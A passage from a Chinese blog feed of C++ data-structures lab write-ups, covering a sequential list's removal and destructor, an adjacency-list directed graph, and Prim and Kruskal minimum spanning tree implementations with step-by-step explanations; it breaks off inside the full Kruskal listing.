<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SeqList::remove</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>&amp; location)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (location &gt;= len || location &lt; <span class="number">0</span> || len == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = location; i &lt; len - <span class="number">1</span>; i++)</span><br><span class="line">            seq[i] = seq[i + <span class="number">1</span>];</span><br><span class="line">        len--;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x07-析构函数"><a href="#0x07-析构函数" class="headerlink" title="0x07 析构函数"></a>0x07 析构函数</h1><p>释放内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">SeqList::~SeqList()&#123;</span><br><span class="line">    <span class="keyword">delete</span>[] seq;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不会存储「有向图」？</title>
    <url>/Data-Structures-Experiment-10/</url>
    <content><![CDATA[<p>Data Structures Experiment #10 - 使用<strong>邻接表</strong>来完成有向图的存储，并实现相应的辅助函数用于检测图存储的是否正确。</p>
<blockquote>
<p><em>根据要求，不可使用顺序表，故对算法进行了改进。</em></p>
</blockquote>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<p>实现Graph的成员函数</p>
<ul>
<li><p><code>Graph(int v);</code></p>
<p>构造一个顶点最多为<code>v</code>的图(编号从<code>1</code>到<code>v</code>)</p>
</li>
<li><p><code>~Graph();</code></p>
<p>析构函数，将分配的空间都释放</p>
</li>
<li><p><code>void addedge(int s, int t, int w);</code></p>
<p>向图中加入从<code>s</code>到<code>t</code>权重为<code>w</code>的边</p>
</li>
<li><p><code>int getOutDegree(int v);</code></p>
<p>获得顶点<code>v</code>的出度</p>
</li>
<li><p><code>int getInDegree(int v);</code></p>
<p>获得顶点<code>v</code>的入度</p>
</li>
<li><p><code>int access(int s, int t);</code></p>
<p>检查从<code>s</code>到<code>t</code>是否存在一个直接连接到边，如果存在，则返回边的权重，如果不存在，则返回<code>-1</code></p>
</li>
</ul>
</blockquote>
<h1 id="0x01-数据域封装"><a href="#0x01-数据域封装" class="headerlink" title="0x01 数据域封装"></a>0x01 数据域封装</h1><p>定义边与顶点结构体。</p>
<p>用邻接表的方式，边需要包括终点和权值，以及用于指向下一条边的指针域。点需要包括入度和出度，以及链接边的头指针。</p>
<p>将顶点创建为图。定义<code>num</code>为点的个数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">EdgeNode</span> &#123;</span></span><br><span class="line">        <span class="keyword">int</span> dest;</span><br><span class="line">        <span class="keyword">int</span> cost;</span><br><span class="line">        EdgeNode* link;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">VertexNode</span> &#123;</span></span><br><span class="line">        <span class="keyword">int</span> inDegree, outDegree;</span><br><span class="line">        EdgeNode* firstAdj;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    VertexNode* VexList;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br></pre></td></tr></table></figure>
<h1 id="0x02-构造函数"><a href="#0x02-构造函数" class="headerlink" title="0x02 构造函数"></a>0x02 构造函数</h1><p>为顶点分配内存，注意顶点从1开始计数。</p>
<p>将顶点的度初始化为0，头指针初始化为空。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Graph::Graph(<span class="keyword">int</span> v)&#123;</span><br><span class="line">    num = v;</span><br><span class="line">    VexList = <span class="keyword">new</span> VertexNode[v + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= v; i++) &#123;</span><br><span class="line">        VexList[i].inDegree = <span class="number">0</span>;</span><br><span class="line">        VexList[i].outDegree = <span class="number">0</span>;</span><br><span class="line">        VexList[i].firstAdj = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-addedge"><a href="#0x03-addedge" class="headerlink" title="0x03 addedge"></a>0x03 addedge</h1><p>用尾插法加边，首先存储边的终点和权值，指针域赋空。</p>
<p>寻找起点链接的最后一条边，将新边链接到它的后面。注意第<code>9</code>行不可写为<code>p = newEdge;</code>，要改变的是头指针，而不是<code>p</code>的指向。</p>
<p>对相应的顶点增加入度或出度。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Graph::addedge</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> t, <span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    EdgeNode* newEdge = <span class="keyword">new</span> EdgeNode;</span><br><span class="line">    newEdge-&gt;cost = w;</span><br><span class="line">    newEdge-&gt;dest = t;</span><br><span class="line">  </span><br><span class="line">    newEdge-&gt;link = <span class="literal">NULL</span>;</span><br><span class="line">    EdgeNode* p = VexList[s].firstAdj;</span><br><span class="line">    <span class="keyword">if</span> (!p)</span><br><span class="line">        VexList[s].firstAdj = newEdge;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (p-&gt;link)</span><br><span class="line">            p = p-&gt;link;</span><br><span class="line">        p-&gt;link = newEdge;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    VexList[s].outDegree++;</span><br><span class="line">    VexList[t].inDegree++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>采用头插法会更加简洁，可以将<code>6</code>～<code>14</code>行替换为</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">newEdge-&gt;link = VexList[s].firstAdj;</span><br><span class="line">VexList[s].firstAdj = newEdge;</span><br></pre></td></tr></table></figure>
<h1 id="0x04-getInDegree"><a href="#0x04-getInDegree" class="headerlink" title="0x04 getInDegree"></a>0x04 getInDegree</h1><p>返回对应顶点的入度。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Graph::getInDegree</span><span class="params">(<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> VexList[v].inDegree;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x05-getOutDegree"><a href="#0x05-getOutDegree" class="headerlink" title="0x05 getOutDegree"></a>0x05 getOutDegree</h1><p>返回对应顶点的出度。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Graph::getOutDegree</span><span class="params">(<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> VexList[v].outDegree;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x06-access"><a href="#0x06-access" class="headerlink" title="0x06 access"></a>0x06 access</h1><p>若起点的头指针为空，则说明不存在以此顶点为起点的边。</p>
<p>若起点的头指针不为空，则从起点的头指针开始，遍历所有边，寻找终点满足条件的边并返回其权值。</p>
<p>找不到则返回<code>-1</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Graph::access</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    EdgeNode* p = VexList[s].firstAdj;</span><br><span class="line">    <span class="keyword">if</span> (!p)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span> (p) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;dest == t)</span><br><span class="line">            <span class="keyword">return</span> p-&gt;cost;</span><br><span class="line">        p = p-&gt;link;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x07-析构函数"><a href="#0x07-析构函数" class="headerlink" title="0x07 析构函数"></a>0x07 析构函数</h1><p>遍历并释放内存。</p>
<p><em>Visual Studio可能会在第<code>5</code>行出现不同的问题导致不可运行。</em></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Graph::~Graph()&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (VexList[i].firstAdj) &#123;</span><br><span class="line">            EdgeNode* temp = VexList[i].firstAdj;</span><br><span class="line">            VexList[i].firstAdj = temp-&gt;link;</span><br><span class="line">            <span class="keyword">delete</span> temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span>[] VexList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不知道 Prim 和 Kruskal 算法？</title>
    <url>/Data-Structures-Experiment-11/</url>
    <content><![CDATA[<p>Data Structures Experiment #11 - 完成最小生成树Prim算法和Kruskal算法</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<p>在上机样例中给出了图类的基础实现。最小生成树算法针对的是无向图，注意与上机10的区别。</p>
<ul>
<li><code>Graph();</code><br>构造函数</li>
<li><code>~Graph();</code><br>析构函数</li>
<li><code>void addedge(int s, int t, int w);</code><br>向图中添加一条从s到t，权重为w的边</li>
<li><code>int prim();</code><br>使用prim算法求得图的最小生成树，并将结果返回</li>
<li><code>int kruskal();</code><br>使用kruskal算法求得图的最小生成树，并将结果返回</li>
</ul>
</blockquote>
<p>经历了多次修改与完善，终于完成了两个算法。</p>
<p>可以使用邻接矩阵或邻接表的方式来表示，本算法采用邻接表。</p>
<h1 id="0x01-数据域封装"><a href="#0x01-数据域封装" class="headerlink" title="0x01 数据域封装"></a>0x01 数据域封装</h1><p>基本思路与<a href="https://www.superpung.xyz/Data-Structures-Experiment-10/">Experiment #10</a>类似。</p>
<p>在边结点中，增加了“起点”<code>vAdj</code>，便于后续算法的实现。</p>
<p>在点结点中，增加了<code>flag</code>标志，用于区分此顶点是否被访问过，同样便于后续算法的实现。</p>
<p>对点与边分别计数，便于控制循环次数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">EdgeNode</span> &#123;</span></span><br><span class="line">        <span class="keyword">int</span> vAdj, vertex;</span><br><span class="line">        <span class="keyword">int</span> weight;</span><br><span class="line">        EdgeNode* next;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">VertexNode</span> &#123;</span></span><br><span class="line">        <span class="keyword">bool</span> flag;</span><br><span class="line">        EdgeNode* firstAdj;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    VertexNode* VexList;</span><br><span class="line">    <span class="keyword">int</span> num_v, num_e;</span><br></pre></td></tr></table></figure>
<h1 id="0x02-构造函数"><a href="#0x02-构造函数" class="headerlink" title="0x02 构造函数"></a>0x02 构造函数</h1><p>构造一个只有顶点没有边的图，注意顶点依然从<code>1</code>开始排序。</p>
<p>初始化所有顶点均未被访问过。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Graph::Graph(<span class="keyword">int</span> max_v)&#123;</span><br><span class="line">    num_v = max_v;</span><br><span class="line">    num_e = <span class="number">0</span>;</span><br><span class="line">    VexList = <span class="keyword">new</span> VertexNode[num_v + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++) &#123;</span><br><span class="line">        VexList[i].firstAdj = <span class="literal">NULL</span>;</span><br><span class="line">        VexList[i].flag = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-addedge"><a href="#0x03-addedge" class="headerlink" title="0x03 addedge"></a>0x03 addedge</h1><p>两种算法针对的是无向图，故两顶点之间双向连通。</p>
<p>边数只记一次。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Graph::addedge</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> t, <span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    EdgeNode* newEdge1 = <span class="keyword">new</span> EdgeNode;</span><br><span class="line">    newEdge1-&gt;weight = w;</span><br><span class="line">    newEdge1-&gt;vAdj = s;</span><br><span class="line">    newEdge1-&gt;vertex = t;</span><br><span class="line"></span><br><span class="line">    newEdge1-&gt;next = VexList[s].firstAdj;</span><br><span class="line">    VexList[s].firstAdj = newEdge1;</span><br><span class="line"></span><br><span class="line">    EdgeNode* newEdge2 = <span class="keyword">new</span> EdgeNode;</span><br><span class="line">    newEdge2-&gt;weight = w;</span><br><span class="line">    newEdge2-&gt;vAdj = t;</span><br><span class="line">    newEdge2-&gt;vertex = s;</span><br><span class="line"></span><br><span class="line">    newEdge2-&gt;next = VexList[t].firstAdj;</span><br><span class="line">    VexList[t].firstAdj = newEdge2;</span><br><span class="line"></span><br><span class="line">    num_e++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x04-Prim’s-algorithm"><a href="#0x04-Prim’s-algorithm" class="headerlink" title="0x04 Prim’s algorithm"></a>0x04 Prim’s algorithm</h1><p>Prim算法的核心思想是<strong>加点</strong>。</p>
<p>从某一顶点开始，寻找与它相连的且相连边权最小的顶点，将它们加入已经访问的顶点集合。再次寻找与这两个顶点相连的所有顶点中相连边权最小的顶点，并加入顶点集合。重复此步骤，直到访问了所有顶点，即全部顶点都已加入已经访问的顶点集合。</p>
<h2 id="1-Initializing"><a href="#1-Initializing" class="headerlink" title="1. Initializing"></a>1. Initializing</h2><p>初始化所有顶点均未被访问，声明<code>sum</code>以存储权之和、<code>min_w</code>以存储每次循环找到的最小权、<code>visited</code>数组以存储已经访问过的顶点、<code>index</code>记录目前已经访问的顶点个数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++)</span><br><span class="line">        VexList[i].flag = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> min_w;</span><br><span class="line"><span class="keyword">int</span>* visited = <span class="keyword">new</span> <span class="keyword">int</span>[num_v];</span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h2 id="2-Starting"><a href="#2-Starting" class="headerlink" title="2. Starting"></a>2. Starting</h2><p>选择一个顶点作为起始顶点，存储到已访问的顶点集合，<strong>并记录为已访问</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (VexList[i].firstAdj) &#123;</span><br><span class="line">        visited[index++] = i;</span><br><span class="line">        VexList[i].flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-Calculating"><a href="#3-Calculating" class="headerlink" title="3. Calculating"></a>3. Calculating</h2><p>当所有顶点未被完全访问时，不断循环，直至顶点全部访问。</p>
<p><code>2</code>～<code>14</code>行：对最小权（<strong>及其顶点</strong>）进行初始化，任取当前顶点与<strong>未访问顶点</strong>所连接边的权（不可随机设定），便于后续进行比较。不可将此步骤置于下一循环体中，否则每当切换顶点后都会对<code>min_w</code>重新赋值。<code>7</code>行要进行判断，若到达链表末尾且未找到尚未访问的顶点，则停止并开始从下一顶点的链表中开始寻找。</p>
<p><code>16</code>～<code>24</code>行：在已经访问的顶点中，<strong>逐个顶点</strong>寻找其与未访问过顶点所连接的边（链表）中最小的权，并将对应顶点存入已访问的顶点集合。（最小权一定要对应顶点）</p>
<p><code>26</code>～<code>28</code>行：<strong>当最小权找到后</strong>，将对应顶点记录为已访问，已访问的顶点个数加一，并把最小权加入<code>sum</code>中。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (index &lt; num_v) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">        EdgeNode* p = VexList[visited[i]].firstAdj;</span><br><span class="line">        <span class="keyword">while</span> (VexList[p-&gt;vertex].flag &amp;&amp; p-&gt;next) &#123;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (VexList[p-&gt;vertex].flag)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            min_w = p-&gt;weight;</span><br><span class="line">            visited[index] = p-&gt;vertex;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">        EdgeNode* p = VexList[visited[i]].firstAdj;</span><br><span class="line">        <span class="keyword">while</span> (p) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;weight &lt;= min_w &amp;&amp; !VexList[p-&gt;vertex].flag) &#123;</span><br><span class="line">                min_w = p-&gt;weight;</span><br><span class="line">                visited[index] = p-&gt;vertex;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    VexList[visited[index]].flag = <span class="literal">true</span>;</span><br><span class="line">    index++;</span><br><span class="line">    sum += min_w;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="4-Freeing-and-Returning"><a href="#4-Freeing-and-Returning" class="headerlink" title="4. Freeing and Returning"></a>4. Freeing and Returning</h2><p><strong>释放内存</strong>，并返回结果。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span>[] visited;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br></pre></td></tr></table></figure>
<h2 id="5-完整的Prim算法"><a href="#5-完整的Prim算法" class="headerlink" title="5. 完整的Prim算法"></a>5. 完整的Prim算法</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Graph::prim</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++)</span><br><span class="line">        VexList[i].flag = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> min_w;</span><br><span class="line">    <span class="keyword">int</span>* visited = <span class="keyword">new</span> <span class="keyword">int</span>[num_v];</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (VexList[i].firstAdj) &#123;</span><br><span class="line">            visited[index++] = i;</span><br><span class="line">            VexList[i].flag = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (index &lt; num_v) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">            EdgeNode* p = VexList[visited[i]].firstAdj;</span><br><span class="line">            <span class="keyword">while</span> (VexList[p-&gt;vertex].flag &amp;&amp; p-&gt;next) &#123;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (VexList[p-&gt;vertex].flag)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                min_w = p-&gt;weight;</span><br><span class="line">                visited[index] = p-&gt;vertex;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">            EdgeNode* p = VexList[visited[i]].firstAdj;</span><br><span class="line">            <span class="keyword">while</span> (p) &#123;</span><br><span class="line">                <span class="keyword">if</span> (p-&gt;weight &lt;= min_w &amp;&amp; !VexList[p-&gt;vertex].flag) &#123;</span><br><span class="line">                    min_w = p-&gt;weight;</span><br><span class="line">                    visited[index] = p-&gt;vertex;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!p-&gt;next)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        VexList[visited[index]].flag = <span class="literal">true</span>;</span><br><span class="line">        index++;</span><br><span class="line">        sum += min_w;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] visited;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x05-Kruskal’s-algorithm"><a href="#0x05-Kruskal’s-algorithm" class="headerlink" title="0x05 Kruskal’s algorithm"></a>0x05 Kruskal’s algorithm</h1><p>Kruskal算法的核心思想是<strong>加边</strong>。</p>
<p>将图中所有边按权值大小进行排序，从权最小的边开始，逐条边加入生成树中，注意加边后不可与已加入的边构成环，直至所有顶点均连通。</p>
<h2 id="1-Initializing-1"><a href="#1-Initializing-1" class="headerlink" title="1. Initializing"></a>1. Initializing</h2><p>声明<code>sum</code>以存储权之和、<code>edges</code>数组以存储边、<code>index</code>记录目前已经访问的边数。</p>
<p>声明<code>begin</code>和<code>end</code>便于判断加边后是否会构成环，<span id = "set"><code>set</code>数组</span>存储每个顶点的<a href="#state"><strong>状态</strong></a>，即所在连通分支，起到函数的作用（<code>set</code>值）。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">EdgeNode* edges = <span class="keyword">new</span> EdgeNode[num_e];</span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> begin, end;</span><br><span class="line"><span class="keyword">int</span>* <span class="built_in">set</span> = <span class="keyword">new</span> <span class="keyword">int</span>[num_v + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++)</span><br><span class="line">    <span class="built_in">set</span>[i] = i;</span><br></pre></td></tr></table></figure>
<h2 id="2-Storing"><a href="#2-Storing" class="headerlink" title="2. Storing"></a>2. Storing</h2><p>从第一个顶点开始，将所有边存入<code>edges</code>数组中。</p>
<p>为避免将同一条边“双向”存储，只存储从小顶点到大顶点方向的边，故在<code>4</code>行进行了判断。</p>
<p>注意存储时还要包括边的“起点”，这是与以往不同的地方，以便于后续对连通分支的判断。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++) &#123;</span><br><span class="line">    EdgeNode* p = VexList[i].firstAdj;          </span><br><span class="line">    <span class="keyword">while</span> (p) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;vertex &gt; i) &#123;</span><br><span class="line">            edges[index].vAdj = i;</span><br><span class="line">            edges[index].vertex = p-&gt;vertex;</span><br><span class="line">            edges[index].weight = p-&gt;weight;</span><br><span class="line">            index++;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-Sorting"><a href="#3-Sorting" class="headerlink" title="3. Sorting"></a>3. Sorting</h2><p>将存储的边按权从小到大进行排序，采用冒泡算法。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num_e; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; num_e; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (edges[i].weight &gt; edges[j].weight) &#123;</span><br><span class="line">            EdgeNode temp = edges[i];</span><br><span class="line">            edges[i] = edges[j];</span><br><span class="line">            edges[j] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="4-Calculating"><a href="#4-Calculating" class="headerlink" title="4. Calculating"></a>4. Calculating</h2><p>以排好序的边数组为基准，从头开始挑选边，并将其加入生成树。当挑选出来的边数达到<code>顶点数-1</code>时，说明已经将所有顶点连通，停止。当所有顶点均已挑选过，停止。</p>
<p><a href="#set">初始化<code>set</code>数组</a>时，<span id = "state">将第<code>i</code>位赋值为<code>i</code></span>，说明每个顶点一开始均自己为一连通分支，即若两顶点的<code>set</code>值不等，则这两个顶点必位于不同的连通分支，此时可以将连接这两个顶点的边加入生成树中。</p>
<p>加入以后，这两个顶点便连通了，也即这两个顶点所在的两个连通分支便连通了。记这两个顶点分别为<code>begin</code>和<code>end</code>。此时将与<code>end</code>在同一连通分支的所有顶点（包括它自己）全部加入到<code>begin</code>的连通分支中（也可以从另一个方向），也即将与<code>end</code>的<code>set</code>值相等的所有顶点的<code>set</code>值全部改为<code>begin</code>的<code>set</code>值。</p>
<p>注意此处必须单独赋值给<code>begin</code>和<code>end</code>，否则随着<code>set</code>值的改变，判断条件中的值也会随即改变，需要让它定下来。</p>
<p>若新加入一条边，则已加入的边数加一。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; num_e &amp;&amp; j &lt; num_v; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">set</span>[edges[i].vAdj] != <span class="built_in">set</span>[edges[i].vertex]) &#123;</span><br><span class="line">        sum += edges[i].weight;</span><br><span class="line">        begin = <span class="built_in">set</span>[edges[i].vAdj];</span><br><span class="line">        end = <span class="built_in">set</span>[edges[i].vertex];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= num_v; k++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">set</span>[k] == end)</span><br><span class="line">                <span class="built_in">set</span>[k] = begin;</span><br><span class="line">        &#125;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="5-Freeing-and-Returning"><a href="#5-Freeing-and-Returning" class="headerlink" title="5. Freeing and Returning"></a>5. Freeing and Returning</h2><p><strong>释放内存</strong>，并返回结果。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span>[] <span class="built_in">set</span>;</span><br><span class="line"><span class="keyword">delete</span>[] edges;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br></pre></td></tr></table></figure>
<h2 id="6-完整的Kruskal算法"><a href="#6-完整的Kruskal算法" class="headerlink" title="6. 完整的Kruskal算法"></a>6. 完整的Kruskal算法</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Graph::kruskal</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* <span class="built_in">set</span> = <span class="keyword">new</span> <span class="keyword">int</span>[num_v + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    EdgeNode* edges = <span class="keyword">new</span> EdgeNode[num_e];</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> begin, end;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++)</span><br><span class="line">        <span class="built_in">set</span>[i] = i;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++) &#123;</span><br><span class="line">        EdgeNode* p = VexList[i].firstAdj;</span><br><span class="line">          </span><br><span class="line">        <span class="keyword">while</span> (p) &#123;</span><br><span class="line">            <span 